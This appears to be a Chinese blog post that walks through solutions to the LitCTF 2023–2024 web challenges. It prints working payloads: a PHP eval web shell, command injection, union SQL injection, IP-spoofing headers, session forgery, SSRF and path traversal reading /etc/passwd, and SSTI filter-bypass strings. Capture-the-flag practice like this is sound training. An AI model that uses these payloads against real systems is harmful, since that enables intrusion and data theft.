@@ -1,0 +1,1261 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  
+  <script>window.icon_font = '4552607_09mhdxci6yrk';window.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ"};</script>
+  
+  
+  <title>
+    LitCTF2023-2024 WEB所有题复现 |
+    
+    一清的博客
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CUbuntu%20Mono:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CUbuntu%20Mono:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+<link rel="stylesheet" href="/css/loader.css">
+
+  <meta name="description" content="[LitCTF 2023]我Flag呢？题目描述 奇怪，放哪里了，怎么看不见呢？（初级难度） 打开环境   查看源码找到flag     [LitCTF 2023]PHP是世界上最好的语言！！题目描述 探姬坚信PHP是世界上最好的语言，于是她用PHP写了一个小工具 （Flag位于根目录）Flag形式 NSSCTF{} 打开环境   构造payload ：system(“ls &#x2F;“);">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LitCTF2023-2024 WEB所有题复现">
+<meta property="og:url" content="http://example.com/2024/06/02/LitCTF2023-2024%20WEB/index.html">
+<meta property="og:site_name" content="一清的博客">
+<meta property="og:description" content="[LitCTF 2023]我Flag呢？题目描述 奇怪，放哪里了，怎么看不见呢？（初级难度） 打开环境   查看源码找到flag     [LitCTF 2023]PHP是世界上最好的语言！！题目描述 探姬坚信PHP是世界上最好的语言，于是她用PHP写了一个小工具 （Flag位于根目录）Flag形式 NSSCTF{} 打开环境   构造payload ：system(“ls &#x2F;“);">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/tutu/53c6ffb54c.jpg">
+<meta property="og:image" content="http://example.com/images/tutu/d5982aaa4f.jpg">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616210656226.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616210945066.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616211114575.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616211417497.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616211454740.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616211826772.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616212135970.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616212534857-1718672274230.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616212926215.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616213025588.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616213413887.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616213827583.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616214238534.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616214650652.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616214724312.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616214851509.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616215045946.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616215124989.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616215157938.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616215308047.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616215409656.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616215700462.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616215802075.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616220050260.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616220123412.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616220418836-1718672364861.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616220539853.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616220618327.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616220654525.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616220747493.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616220901615.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616221125326.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616221805850.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616221902119.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616222254027.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616222541826.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616222627492.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616222838848.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616223051654.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616223248608.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616225212258.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616225252448.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616225636712.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616225742642.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616225800944.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616225924634.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616230434428.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616230718303.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616230914449.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616231613712.png">
+<meta property="og:image" content="http://example.com/images/tutu/d172f76fd4fd4958b7dc411073290e74.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616232432039.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616232527357.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616233108535.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616233316035.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616233459337.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240616233635459.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240617185606258.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240617185944907.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240617190112208.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240617190557767.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240617190746623.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240617190918626.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240617191005819.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240617191102827.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240617204643361.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240617204804002.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240617205357694.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240617205449475.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240617210926459.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240617211049537.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240617211138490.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240617212110535.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240617212200141.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240617212244509.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240617212527547.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240617212543111.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240617213025806.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240617213927200.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240617214037904.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240617214204554.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240617214505074.png">
+<meta property="og:image" content="http://example.com/images/tutu/image-20240617215514213.png">
+<meta property="article:published_time" content="2024-06-02T08:43:38.000Z">
+<meta property="article:modified_time" content="2024-06-18T03:18:07.201Z">
+<meta property="article:author" content="yiqing">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/tutu/53c6ffb54c.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="一清的博客" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css">
+
+  
+  
+  
+  
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"></script>
+
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/wowjs@1.1.3/css/libs/animate.css">
+
+    
+<script src="https://npm.webcache.cn/wowjs@1.1.3/dist/wow.min.js"></script>
+
+    <script>
+      new WOW({
+        offset: 0,
+        mobile: true,
+        live: false
+      }).init();
+    </script>
+  
+  
+    <script src="/sw.js"></script>
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg"></div>
+    <div class="loading-right-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+          <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff6e6b" />
+          <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z" fill="#fd0d00" />
+          <path d="M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95" fill="#fd0d00" />
+        </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    const startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    const endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="display: none; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/">首页</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/archives">归档</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/about">关于</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/friend">友链</a>
+      </span>
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <img fetchpriority="high" src="/images/banner.webp" alt="LitCTF2023-2024 WEB所有题复现">
+  
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div id="logo-wrap">
+        
+          
+          
+            <a href="/" id="logo">
+              <h1>LitCTF2023-2024 WEB所有题复现</h1>
+            </a>
+          
+        
+      </div>
+      
+        
+        <h2 id="subtitle-wrap">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content" class="outer">
+          
+          <section id="main"><article id="post-LitCTF2023-2024 WEB" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner">
+    <div class="article-meta">
+      <div class="article-date wow slideInLeft">
+  <a href="/2024/06/02/LitCTF2023-2024%20WEB/" class="article-date-link">
+    <time datetime="2024-06-02T08:43:38.000Z" itemprop="datePublished">2024-06-02</time>
+  </a>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h3 id="LitCTF-2023-我Flag呢？"><a href="#LitCTF-2023-我Flag呢？" class="headerlink" title="[LitCTF 2023]我Flag呢？"></a>[LitCTF 2023]我Flag呢？</h3><p>题目描述</p>
+<p>奇怪，放哪里了，怎么看不见呢？（初级难度）</p>
+<p>打开环境</p>
+<img src="/images/tutu/53c6ffb54c.jpg" alt="图片" width="300" height="200">
+
+<p>查看源码找到flag</p>
+<img src="/images/tutu/d5982aaa4f.jpg" alt="图片" width="300" height="200">
+
+
+
+<h3 id="LitCTF-2023-PHP是世界上最好的语言！！"><a href="#LitCTF-2023-PHP是世界上最好的语言！！" class="headerlink" title="[LitCTF 2023]PHP是世界上最好的语言！！"></a>[LitCTF 2023]PHP是世界上最好的语言！！</h3><p>题目描述</p>
+<p>探姬坚信PHP是世界上最好的语言，于是她用PHP写了一个小工具 （Flag位于根目录）<br>Flag形式 NSSCTF{}</p>
+<p>打开环境</p>
+<img src="/images/tutu/image-20240616210656226.png" alt="图片" width="300" height="200">
+
+<p>构造payload ：system(“ls &#x2F;“);</p>
+<img src="/images/tutu/image-20240616210945066.png" alt="图片" width="300" height="200">
+
+<p>flag在根目录</p>
+<p>构造payload ：system(“cat &#x2F;flag”);</p>
+<img src="/images/tutu/image-20240616211114575.png" alt="图片" width="300" height="200">
+
+
+
+<h3 id="LitCTF-2023-导弹迷踪"><a href="#LitCTF-2023-导弹迷踪" class="headerlink" title="[LitCTF 2023]导弹迷踪"></a>[LitCTF 2023]导弹迷踪</h3><p>题目描述</p>
+<p>你是一颗导弹，你需要，飞到最后！（通过6道关卡就能拿到flag哦~<br>Flag形式 NSSCTF{}</p>
+<p>打开环境</p>
+<img src="/images/tutu/image-20240616211417497.png" alt="图片" width="300" height="200">
+
+<p>前端js游戏，直接F12查看js文件</p>
+<img src="/images/tutu/image-20240616211454740.png" alt="图片" width="300" height="200">
+
+
+
+<h3 id="LitCTF-2023-Follow-me-and-hack-me"><a href="#LitCTF-2023-Follow-me-and-hack-me" class="headerlink" title="[LitCTF 2023]Follow me and hack me"></a>[LitCTF 2023]Follow me and hack me</h3><p>题目描述</p>
+<p>跟我来~<br>Flag形式 NSSCTF{}</p>
+<p>打开环境</p>
+<img src="/images/tutu/image-20240616211826772.png" alt="图片" width="300" height="200">
+
+<p>传参题</p>
+<p>payload:<a target="_blank" rel="noopener" href="http://node5.anna.nssctf.cn:28986/?CTF=Lit2023">http://node5.anna.nssctf.cn:28986/?CTF=Lit2023</a> (GET)</p>
+<p>POST:Challenge&#x3D;i’m_c0m1ng</p>
+<img src="/images/tutu/image-20240616212135970.png" alt="图片" width="300" height="200">
+
+
+
+<h3 id="LitCTF-2023-Ping"><a href="#LitCTF-2023-Ping" class="headerlink" title="[LitCTF 2023]Ping"></a>[LitCTF 2023]Ping</h3><p>题目描述</p>
+<p>看看能PING出什么<br>Flag形式 NSSCTF{}</p>
+<p>打开环境</p>
+<img src="/images/tutu/image-20240616212534857-1718672274230.png" alt="图片" width="300" height="200">
+
+<p>ping命令考察，先输入回环地址：127.0.0.1</p>
+<img src="/images/tutu/image-20240616212926215.png" alt="图片" width="300" height="200">
+
+<p>构造payload:127.0.0.1|ls</p>
+<img src="/images/tutu/image-20240616213025588.png" alt="图片" width="300" height="200">
+
+<p>bp抓包</p>
+<p>构造payload：127.0.0.1;ls</p>
+<img src="/images/tutu/image-20240616213413887.png" alt="图片" width="300" height="200">
+
+<p>找到flag位置，构造payload查看flag</p>
+<p>payload:127.0.0.1;cat &#x2F;*</p>
+<img src="/images/tutu/image-20240616213827583.png" alt="图片" width="300" height="200">
+
+
+
+<h3 id="LitCTF-2023-1zjs"><a href="#LitCTF-2023-1zjs" class="headerlink" title="[LitCTF 2023]1zjs"></a>[LitCTF 2023]1zjs</h3><p>题目描述</p>
+<p>js…?不确定，再看看。<br>Flag形式 NSSCTF{}</p>
+<p>打开环境</p>
+<img src="/images/tutu/image-20240616214238534.png" alt="图片" width="300" height="200">
+
+<p>魔方小游戏</p>
+<p>查看js源码</p>
+<img src="/images/tutu/image-20240616214650652.png" alt="图片" width="300" height="200">
+
+<p>跟进访问这个目录</p>
+<img src="/images/tutu/image-20240616214724312.png" alt="图片" width="300" height="200">
+
+<p>jsfuck解密</p>
+<img src="/images/tutu/image-20240616214851509.png" alt="图片" width="300" height="200">
+
+
+
+<h3 id="LitCTF-2023-作业管理系统"><a href="#LitCTF-2023-作业管理系统" class="headerlink" title="[LitCTF 2023]作业管理系统"></a>[LitCTF 2023]作业管理系统</h3><p>题目描述</p>
+<p>交作业！！但是哪里不对？</p>
+<p>打开环境</p>
+<img src="/images/tutu/image-20240616215045946.png" alt="图片" width="300" height="200">
+
+<p>查看源码</p>
+<img src="/images/tutu/image-20240616215124989.png" alt="图片" width="300" height="200">
+
+<p>得到用户名和密码，登录系统</p>
+<img src="/images/tutu/image-20240616215157938.png" alt="图片" width="300" height="200">
+
+<p>考察文件上传</p>
+<p>首先创建文件</p>
+<p>创建文件名为flag.php</p>
+<img src="/images/tutu/image-20240616215308047.png" alt="图片" width="300" height="200">
+
+<p>编辑文件内容，也就是上传一句话木马</p>
+<?php
+@eval($_POST["1"]);
+?
+
+<img src="/images/tutu/image-20240616215409656.png" alt="图片" width="300" height="200">
+
+蚁剑连接
+
+<img src="/images/tutu/image-20240616215700462.png" alt="图片" width="300" height="200">
+
+查找flag
+
+<img src="/images/tutu/image-20240616215802075.png" alt="图片" width="300" height="200">
+
+
+
+### [LitCTF 2023]Http pro max plus
+
+题目描述
+
+怎么还有一层…
+
+
+
+打开环境
+
+<img src="/images/tutu/image-20240616220050260.png" alt="图片" width="300" height="200">
+
+试一试xff
+
+<img src="/images/tutu/image-20240616220123412.png" alt="图片" width="300" height="200">
+
+被嘲讽了
+
+总结:
+
+X-Forwarded: 127.0.0.1
+Forwarded-For: 127.0.0.1
+Forwarded: 127.0.0.1
+X-Requested-With: 127.0.0.1
+X-Forwarded-Proto: 127.0.0.1
+X-Forwarded-Host: 127.0.0.1
+X-remote-IP: 127.0.0.1
+X-remote-addr: 127.0.0.1
+True-Client-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+Client-IP: 127.0.0.1
+X-Real-IP: 127.0.0.1
+Ali-CDN-Real-IP: 127.0.0.1
+Cdn-Src-Ip: 127.0.0.1
+Cdn-Real-Ip: 127.0.0.1
+CF-Connecting-IP: 127.0.0.1
+X-Cluster-Client-IP: 127.0.0.1
+WL-Proxy-Client-IP: 127.0.0.1
+Proxy-Client-IP: 127.0.0.1
+Fastly-Client-Ip: 127.0.0.1
+True-Client-Ip: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Host: 127.0.0.1
+X-Custom-IP-Authorization: 127.0.0.1
+
+
+
+使用Client-IP: 127.0.0.1
+
+<img src="/images/tutu/image-20240616220418836-1718672364861.png" alt="图片" width="300" height="200">
+
+添加referer
+
+<img src="/images/tutu/image-20240616220539853.png" alt="图片" width="300" height="200">
+
+修改UA
+
+<img src="/images/tutu/image-20240616220618327.png" alt="图片" width="300" height="200">
+
+添加代理
+
+<img src="/images/tutu/image-20240616220654525.png" alt="图片" width="300" height="200">
+
+访问这个目录
+
+<img src="/images/tutu/image-20240616220747493.png" alt="图片" width="300" height="200">
+
+查看源码得到提示，访问/sejishikong.php目录
+
+得到flag
+
+<img src="/images/tutu/image-20240616220901615.png" alt="图片" width="300" height="200">
+
+
+
+### [LitCTF 2023]Vim yyds
+
+漏…漏了！
+Flag形式 NSSCTF{}
+
+
+
+打开环境
+
+<img src="/images/tutu/image-20240616221125326.png" alt="图片" width="300" height="200">
+
+扫描网址目录
+
+<img src="/images/tutu/image-20240616221805850.png" alt="图片" width="300" height="200">
+
+访问/.index.php.swp
+
+<img src="/images/tutu/image-20240616221902119.png" alt="图片" width="300" height="200">
+
+打开下载的文件
+
+vim -r 恢复文件，正常打开会乱码所以要恢复
+
+<img src="/images/tutu/image-20240616222254027.png" alt="图片" width="300" height="200">
+
+说明我们要传入`password`变量，使其值[base64加密](https://so.csdn.net/so/search?q=base64加密&spm=1001.2101.3001.7020)后的`Give_Me_Your_Flag`
+
+<img src="/images/tutu/image-20240616222541826.png" alt="图片" width="300" height="200">
+
+通过命令执行漏洞进行命令执行，得到flag
+
+<img src="/images/tutu/image-20240616222627492.png" alt="图片" width="300" height="200">
+
+
+
+### [LitCTF 2023]这是什么？SQL ！注一下 ！
+
+题目描述
+
+为了安全起见多带了几个套罢了o(*////▽////*)q
+
+
+
+打开环境
+
+<img src="/images/tutu/image-20240616222838848.png" alt="图片" width="300" height="200">
+
+先判断显示位，payload：-1)))))) union select 1,2#
+
+<img src="/images/tutu/image-20240616223051654.png" alt="图片" width="300" height="200">
+
+爆库：
+
+1)))))) and 1=2 union select 1,group_concat(schema_name) from information_schema.schemata#
+
+<img src="/images/tutu/image-20240616223248608.png" alt="图片" width="300" height="200">
+
+爆表：
+
+1))))))union select 1,group_concat(table_name) from information_schema.tables where table_schema='ctftraining'--+
+
+爆列：
+
+1)))))) and 1=2 union select 1,group_concat(column_name)from information_schema.columns where table_name="flag"#
+
+<img src="/images/tutu/image-20240616225212258.png" alt="图片" width="300" height="200">
+
+爆字段
+
+1)))))) and 1=2 union select 1,group_concat(flag) from ctftraining.flag#
+
+<img src="/images/tutu/image-20240616225252448.png" alt="图片" width="300" height="200">
+
+
+
+### [LitCTF 2023]Flag点击就送！
+
+题目描述
+
+大型Flag赠送活动开始啦，不过只有管理员才能拿到
+Flag形式 NSSCTF{}
+
+
+
+打开环境
+
+<img src="/images/tutu/image-20240616225636712.png" alt="图片" width="300" height="200">
+
+随便输入
+
+<img src="/images/tutu/image-20240616225742642.png" alt="图片" width="300" height="200">
+
+点击拿flag
+
+<img src="/images/tutu/image-20240616225800944.png" alt="图片" width="300" height="200">
+
+检测cookie发现存在session伪造
+
+<img src="/images/tutu/image-20240616225924634.png" alt="图片" width="300" height="200">
+
+使用flask_session_cookie_manager3进行session伪造
+
+先解密验证一下
+
+<img src="/images/tutu/image-20240616230434428.png" alt="图片" width="300" height="200">
+
+发现正确
+
+然后加密
+
+<img src="/images/tutu/image-20240616230718303.png" alt="图片" width="300" height="200">
+
+抓包替换session值
+
+<img src="/images/tutu/image-20240616230914449.png" alt="图片" width="300" height="200">
+
+
+
+### [LitCTF 2023]就当无事发生
+
+题目描述
+
+https://ProbiusOfficial.github.io
+差点数据没脱敏就发出去了，还好还没来得及部署，重新再pull一次（x
+Flag形式 NSSCTF{}
+
+
+
+访问链接
+
+社工题
+
+<img src="/images/tutu/image-20240616231613712.png" alt="图片" width="300" height="200">
+
+
+
+### [LitCTF 2023]彩蛋
+
+彩蛋分布于 我Flag呢 Follow me and hack me 作业管理系统 狠狠的注入 四个题目 中
+Flag形式 NSSCTF{}
+
+彩蛋1:我Flag呢
+
+查看源码
+
+<img src="/images/tutu/d172f76fd4fd4958b7dc411073290e74.png" alt="图片" width="300" height="200">
+
+LitCTF{First_t0_The_k3y! (1/?) 
+
+
+
+彩蛋3Follow me and hack me
+
+下载备份文件
+
+www.zip
+
+<img src="/images/tutu/image-20240616232432039.png" alt="图片" width="300" height="200">
+
+查看index.php.bak文件
+
+<img src="/images/tutu/image-20240616232527357.png" alt="图片" width="300" height="200">
+
+_R3ady_Pl4yer_000ne_ (3/?)
+
+
+
+彩蛋2：作业管理系统
+
+<img src="/images/tutu/image-20240616233108535.png" alt="图片" width="300" height="200">
+
+下面有个链接，不能复制只能截图识别
+
+<img src="/images/tutu/image-20240616233316035.png" alt="图片" width="300" height="200">
+
+下载图片
+
+<img src="/images/tutu/image-20240616233459337.png" alt="图片" width="300" height="200">
+
+_S0_ne3t? (2/?)
+
+
+
+彩蛋4：这是什么？SQL ！注一下 ！
+
+id=2
+
+<img src="/images/tutu/image-20240616233635459.png" alt="图片" width="300" height="200">
+
+F1rst_to_Th3_eggggggggg!} (4/4)
+
+
+
+组合得到NSSCTF{First_t0_The_k3y!_S0_ne3t?_R3ady_Pl4yer_000ne_F1rst_to_Th3_eggggggggg!}
+
+
+
+### [LitCTF 2024]浏览器也能套娃？
+
+题目描述
+
+浏览器里套浏览器再套浏览器！
+
+
+
+打开环境
+
+<img src="/images/tutu/image-20240617185606258.png" alt="图片" width="300" height="200">
+
+试着输入csdn网址 https://blog.csdn.net/
+
+发现正常，可能是ssrf
+
+利用file协议
+
+file:///etc/passwd
+
+<img src="/images/tutu/image-20240617185944907.png" alt="图片" width="300" height="200">
+
+发现返回了，直接查找flag
+
+<img src="/images/tutu/image-20240617190112208.png" alt="图片" width="300" height="200">
+
+
+
+### [LitCTF 2024]高亮主题(划掉)背景查看器
+
+题目描述
+
+这逻辑合乎周礼么（？
+
+
+
+打开环境
+
+<img src="/images/tutu/image-20240617190557767.png" alt="图片" width="300" height="200">
+
+抓包
+
+<img src="/images/tutu/image-20240617190746623.png" alt="图片" width="300" height="200">
+
+目录遍历
+
+<img src="/images/tutu/image-20240617190918626.png" alt="图片" width="300" height="200">
+
+theme=../../../../etc/passwd
+
+<img src="/images/tutu/image-20240617191005819.png" alt="图片" width="300" height="200">
+
+theme=../../../../flag
+
+<img src="/images/tutu/image-20240617191102827.png" alt="图片" width="300" height="200">
+
+
+
+### [LitCTF 2024]一个....池子？
+
+题目描述
+
+试着输入一些有趣的内容吧ww
+
+
+
+打开环境
+
+<img src="/images/tutu/image-20240617204643361.png" alt="图片" width="300" height="200">
+
+随便输入777
+
+<img src="/images/tutu/image-20240617204804002.png" alt="图片" width="300" height="200">
+
+正常回返777
+
+输入49
+
+<img src="/images/tutu/image-20240617205357694.png" alt="图片" width="300" height="200">
+
+回显7777777
+
+存在ssti
+
+查看app.py
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;app.py&#x27;,&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/images/tutu/image-20240617205449475.png" alt="图片" width="300" height="200">
+
+确定表单是input
+
+方法一:风景一把梭
+
+<img src="/images/tutu/image-20240617210926459.png" alt="图片" width="300" height="200">
+
+确实好用
+
+方法二:
+
+字符串拼接的方式绕过waf
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).listdir(&#x27;/&#x27;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/images/tutu/image-20240617211049537.png" alt="图片" width="300" height="200">
+
+字符串拼接读取flag
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/fl&#x27;+&#x27;ag&#x27;,&#x27;r&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/images/tutu/image-20240617211138490.png" alt="图片" width="300" height="200">
+
+
+
+### [LitCTF 2024]百万美元的诱惑
+
+题目描述
+
+日元贬值))关我美元什么事~
+
+
+
+打开环境
+
+<img src="/images/tutu/image-20240617212110535.png" alt="图片" width="300" height="200">
+
+payload:?a[]=1&b[]=2&c=2025a
+
+<img src="/images/tutu/image-20240617212200141.png" alt="图片" width="300" height="200">
+
+访问/dollar.php
+
+<img src="/images/tutu/image-20240617212244509.png" alt="图片" width="300" height="200">
+
+利用$()绕过
+
+payload：
+
+x=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
+
+<img src="/images/tutu/image-20240617212527547.png" alt="图片" width="300" height="200">
+
+查看源码
+
+<img src="/images/tutu/image-20240617212543111.png" alt="图片" width="300" height="200">
+
+
+
